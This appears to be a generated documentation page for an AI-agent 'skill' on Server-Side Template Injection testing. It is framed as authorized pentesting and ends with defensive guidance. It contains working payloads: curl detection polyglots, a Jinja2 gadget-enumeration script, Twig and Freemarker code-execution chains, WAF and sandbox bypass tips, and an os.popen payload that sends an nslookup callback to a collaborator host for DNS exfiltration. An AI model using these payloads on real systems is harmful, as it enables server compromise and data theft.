@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ssti</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ssti</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a web application for Server-Side Template</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="web-xss.html">web-xss</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr></tbody></table><p>Server-Side Template Injection happens when user input is embedded in a template that the server renders, so template syntax in the input gets executed. This skill covers the full authorized methodology: detecting injection with polyglots, identifying the engine, escalating to code execution per engine, and handling blind cases. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find every input whose value is reflected in rendered output: profile</li>
+<p>fields, names, comments, ticket subjects, email bodies, PDF content.</p>
+<li>Inject the detection polyglot and read which parts evaluate.</li>
+<li>Identify the template engine from the syntax that evaluated and from</li>
+<p>error messages.</p>
+<li>Move from math evaluation to reading engine objects and attributes.</li>
+<li>Escalate to arbitrary code or command execution using the engine&#x27;s</li>
+<p>documented gadget chains.</p>
+<li>For blind SSTI (no reflection), prove execution out-of-band with DNS</li>
+<p>or HTTP callbacks.</p>
+<li>Stop at a harmless proof (whoami, id, a marker file read) per the</li>
+<p>rules of engagement.</p>
+<li>Record the payload, engine, and output for the report.</li>
+</ol>
+<h2>1. Detection with polyglots</h2>
+<p>Start with inputs that render back to you. Inject expressions from several syntax families at once and see which one computes.</p>
+<pre><code class="language-bash"># Master detection polyglot: covers {{ }}, ${ }, #{ }, &lt;%= %&gt;, *{ }
+curl -s -X POST &#x27;https://target.example/profile&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  --data-urlencode &#x27;name=${7*7}{{7*7}}#{7*7}&lt;%= 7*7 %&gt;*{7*7}&#x27; \
+  | grep -o &#x27;.\{0,40\}49.\{0,20\}&#x27; | head -5</code></pre>
+<pre><code class="language-bash"># Simpler staged approach when the polyglot is too noisy.
+# Stage 1: plain math should come back unchanged if nothing evaluates.
+curl -s &#x27;https://target.example/greet?name=7*7&#x27;
+
+# Stage 2: try each syntax family separately
+for p in &#x27;{{7*7}}&#x27; &#x27;${7*7}&#x27; &#x27;#{7*7}&#x27; &#x27;&lt;%= 7*7 %&gt;&#x27; &#x27;*{7*7}&#x27;; do
+  echo &quot;--- payload: $p&quot;
+  curl -s --get &#x27;https://target.example/greet&#x27; --data-urlencode &quot;name=$p&quot; \
+    | grep -o &#x27;Hello[^&lt;]*&#x27; | head -1
+done</code></pre>
+<p>If <code>{{7*7}}</code> renders as <code>49</code>, you have template evaluation. If it renders literally, that engine is not in play (or output encoding neutralized it, so also test in contexts like emails and error pages).</p>
+<p>Confirm code context versus plaintext context:</p>
+<pre><code class="language-bash"># In code context, closing the statement may be needed:
+# try }} first, then check if raw template code leaks in errors
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name={{7*7}}&#x27; | grep -i -E &#x27;error|exception|trace&#x27; | head -3</code></pre>
+<h2>2. Engine fingerprinting</h2>
+<p>Different engines, different probes. Use these to pin the engine before building an exploit.</p>
+<pre><code class="language-bash"># Jinja2 / Twig style {{ }}: string concat and filters
+# {{&#x27;a&#x27;~&#x27;b&#x27;}} -&gt; &#x27;ab&#x27; means Twig; {{&#x27;a&#x27;+&#x27;b&#x27;}} or config access means Jinja2
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &quot;name={{&#x27;a&#x27;~&#x27;b&#x27;}}&quot;
+
+# Freemarker ${ }: built-ins
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name=${&quot;a&quot;?upper_case}&#x27;
+
+# Velocity #set / #foreach
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name=#set($x=7*7)$x&#x27;
+
+# ERB &lt;%= %&gt;: Ruby
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name=&lt;%= 7*7 %&gt;&#x27;
+
+# Smarty { }: PHP
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name={7*7}&#x27;</code></pre>
+<p>Error messages are gold: a Python traceback points at Jinja2 or Tornado, a Java stack trace at Freemarker or Velocity, Ruby traces at ERB. Save every error page; the engine name often appears in the first lines.</p>
+<p>Reference table (probe, engine, language):</p>
+<ul>
+<li><code>{{7*7}}</code> then <code>{{config}}</code>: Jinja2 (Python).</li>
+<li><code>{{7*7}}</code> then <code>{{&#x27;a&#x27;~&#x27;b&#x27;}}</code>: Twig (PHP).</li>
+<li><code>${7*7}</code>: Freemarker or Velocity (Java), or Thymeleaf <code>[[${7*7}]]</code>.</li>
+<li><code>#{7*7}</code>: Pug/Jade (Node) or Freemarker string interpolation.</li>
+<li><code>&lt;%= 7*7 %&gt;</code>: ERB (Ruby) or EJS (Node).</li>
+<li><code>*{7*7}</code>: Spring expression language (Java).</li>
+</ul>
+<h2>3. Jinja2 exploitation (Python)</h2>
+<p>Jinja2 is the most common SSTI target. Walk from object access to code execution step by step.</p>
+<pre><code class="language-bash"># Step 1: confirm object graph access
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &quot;name={{&#x27;&#x27;.__class__}}&quot; | grep -o &#x27;class[^&lt;]*&#x27; | head -1
+
+# Step 2: reach object subclasses
+# {{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()}} lists every loaded class</code></pre>
+<p>Once subclasses are reachable, the classic chain finds a class that gives process access. The well-known gadget (use only on authorized targets):</p>
+<pre><code>{{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X]...}}</code></pre>
+<p>Rather than memorizing an index (it shifts between Python builds), enumerate programmatically through the injection point with a small script that pages through subclasses looking for useful ones (<code>warnings.catch_warnings</code>, <code>subprocess.Popen</code>, file loaders). Or use the shorter lipsum/config routes when available:</p>
+<pre><code class="language-bash"># If config is exposed, secrets may sit in it directly
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name={{config}}&#x27;
+
+# lipsum is a classic exposed global in Flask debug contexts
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name={{lipsum.__globals__}}&#x27;</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Find a usable gadget class index through a Jinja2 SSTI point.&quot;&quot;&quot;
+import urllib.request, urllib.parse, re
+
+BASE = &quot;https://target.example/greet&quot;
+def render(payload):
+    url = BASE + &quot;?&quot; + urllib.parse.urlencode({&quot;name&quot;: payload})
+    return urllib.request.urlopen(url, timeout=15).read().decode(errors=&quot;replace&quot;)
+
+# Dump a slice of subclasses and search for interesting names
+out = render(&quot;{{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()}}&quot;)
+for i, m in enumerate(re.finditer(r&quot;class &#x27;([\w.]+)&#x27;&quot;, out)):
+    name = m.group(1)
+    if any(k in name for k in (&quot;Popen&quot;, &quot;catch_warnings&quot;, &quot;file&quot;, &quot;BuiltinImporter&quot;)):
+        print(i, name)</code></pre>
+<p>Keep command output small (for example <code>id</code> or <code>whoami</code>) so the response stays readable, and URL-encode the whole payload.</p>
+<h2>4. Twig, Freemarker, and Velocity exploitation</h2>
+<p>Twig (PHP):</p>
+<pre><code class="language-bash"># Confirm Twig string concatenation
+curl -s --get &#x27;https://target.example/greet&#x27; --data-urlencode &quot;name={{&#x27;a&#x27;~&#x27;b&#x27;}}&quot;
+# Classic Twig RCE via the _self / env globals (authorized targets only):
+# {{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}</code></pre>
+<p>Freemarker (Java):</p>
+<pre><code class="language-bash"># Confirm built-ins evaluate
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name=${&quot;abc&quot;?upper_case}&#x27;
+# Freemarker RCE via ?new (authorized targets only):
+# &lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ex(&quot;id&quot;)}</code></pre>
+<p>Velocity (Java):</p>
+<pre><code class="language-bash"># Confirm directive evaluation
+curl -s --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name=#set($x=&quot;a&quot;)$x&#x27;</code></pre>
+<p>Each engine has published sandbox escapes; match the payload to the exact engine version you fingerprinted, because sandboxes change between releases. When a sandbox blocks attribute access, try the engine&#x27;s own introspection helpers (Twig&#x27;s <code>_self</code>, Freemarker&#x27;s <code>?api</code>) before exotic bypasses.</p>
+<h2>5. Blind SSTI</h2>
+<p>When the template renders but the output never shows your input (stored templates rendered into emails, PDFs, or logs), go out-of-band.</p>
+<pre><code class="language-bash"># Jinja2 blind: make the server resolve a unique collaborator subdomain
+# {{&#x27;&#x27;.__class__.__mro__[1].__subclasses__()}} is too noisy blind;
+# instead use a URL fetch if the sandbox permits, else DNS:
+# {{ config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;nslookup YOURID.oastify.com&#x27;).read() }}</code></pre>
+<p>Simpler blind confirmation first, using time:</p>
+<pre><code class="language-bash"># Freemarker/Java blind timing (authorized targets only):
+# &lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ex(&quot;sleep 5&quot;)}
+# Measure the response time with curl -w &#x27;%{time_total}&#x27;
+curl -s -o /dev/null -w &#x27;%{time_total}\n&#x27; --get &#x27;https://target.example/greet&#x27; \
+  --data-urlencode &#x27;name=&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ex(&quot;sleep 5&quot;)}&#x27;</code></pre>
+<p>If timing confirms execution, switch to DNS exfiltration for data: embed the data in a subdomain the target resolves, and read it in the collaborator log. Keep exfiltrated data minimal (a hostname, a username), per the engagement rules.</p>
+<h2>6. SSTI in emails, PDFs, and filenames</h2>
+<p>Templates hide in places beyond web pages:</p>
+<ul>
+<li>Password-reset and notification emails often render <code>{{name}}</code>.</li>
+<li>PDF generators (invoice templates) evaluate expressions server side.</li>
+<li>Exported filenames and CSV headers sometimes pass through a template.</li>
+<li>Error pages that echo the bad input (<code>/nonexistent-{{7*7}}</code>).</li>
+</ul>
+<p>Test each by registering the polyglot as your display name or input value, then triggering the render (request a reset email, generate the PDF, visit the error page). The injection point and the render point are often different requests, so track both.</p>
+<pre><code class="language-bash"># Set the display name to the polyglot, then trigger a render
+curl -s -X POST &#x27;https://target.example/profile&#x27; -b &#x27;session=ATTACKERSESSION&#x27; \
+  --data-urlencode &#x27;display_name=${7*7}{{7*7}}&#x27; -o /dev/null
+curl -s &#x27;https://target.example/invoice.pdf&#x27; -b &#x27;session=ATTACKERSESSION&#x27; \
+  -o /tmp/invoice.pdf
+pdftotext /tmp/invoice.pdf - 2&gt;/dev/null | grep -E &#x27;49|\$\{|\{\{&#x27; | head -3</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The application HTML-encodes your payload on reflection. Encoding</li>
+<p>happens after template rendering in broken apps, so SSTI still works; in correct apps the payload renders literally and there is no bug. Test in non-HTML contexts (emails, PDFs) where encoding may differ.</p>
+<li>WAF strips <code>{{</code> and <code>}}</code>. Try alternate syntaxes for the same engine</li>
+<p>(<code>{% %}</code> blocks, string interpolation <code>#{}</code>), or split the payload across two parameters that get concatenated before rendering.</p>
+<li>The template is rendered twice (double evaluation): your output gets</li>
+<p>re-rendered, which can break payloads or, rarely, double-execute. Detect by injecting <code>{{&#x27;{{7*7}}&#x27;}}</code> and watching for <code>49</code>.</p>
+<li>Sandboxed Jinja2 (SandboxedEnvironment) blocks <code>__class__</code> and</li>
+<p>friends. Published bypasses exist per version; fingerprint the exact Jinja2 version from error pages before trying them.</p>
+<li>Input length limits truncate payloads. Build the shortest chain that</li>
+<p>works, or split logic across multiple injections if the template concatenates fields.</p>
+<li>The injection lands inside a template comment or string literal. Break</li>
+<p>out first (<code>}}</code> then your code, or close the quote), mirroring how you would escape any code context.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No reflection anywhere: treat it as blind from the start and use</li>
+<p>timing plus DNS callbacks for every step.</p>
+<li>Object traversal blocked: look for exposed globals the developers</li>
+<p>left in scope (<code>config</code>, <code>request</code>, <code>lipsum</code>, <code>cycler</code>, <code>joiner</code> in Flask/Jinja2) that skip the sandbox.</p>
+<li><code>os</code> and <code>subprocess</code> unreachable: read files instead of running</li>
+<p>commands (template file readers, <code>open()</code> via reachable classes); a local file read still proves server-side execution.</p>
+<li>RCE achieved but egress filtered: the DNS callback may fail while</li>
+<p>HTTP works, or vice versa; test both channels, and fall back to writing output into a rendered field you can read (profile bio, order notes).</p>
+<li>Engine misidentified: go back to the error messages. A single real</li>
+<p>stack trace beats ten guessed payloads.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see SSTI as template syntax (<code>{{</code>, <code>${</code>, <code>#{</code>, <code>&lt;%</code>) arriving in user input, followed by error pages leaking engine internals or by outbound DNS/HTTP callbacks from the server. Application logs may show the raw payload in the input that was rendered. The durable fix is to never render user input as a template: keep user data as variables, never as template source. If user-influenced templates are unavoidable, use logic-less templates (Mustache-style) or a hardened sandbox, run rendering with least privilege, and strip template syntax from input on the way in. Monitor for template error stack traces in production logs; they are both an information leak and evidence of active probing.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the injection</li>
+<p>point.</p>
+<li>MITRE ATT&amp;CK T1059 (Command and Scripting Interpreter): post-exploit</li>
+<p>command execution.</p>
+<li>CWE-1336 (Improper Neutralization of Special Elements Used in a</li>
+<p>Template Engine): SSTI.</p>
+<li>CWE-94 (Improper Control of Generation of Code, Code Injection).</li>
+<li>OWASP Testing Guide: Testing for Server-Side Template Injection.</li>
+<li>PortSwigger Web Security Academy: SSTI labs, engine decision tree,</li>
+<p>and cheat sheet.</p>
+<li>Jinja2 documentation: SandboxedEnvironment and API reference.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
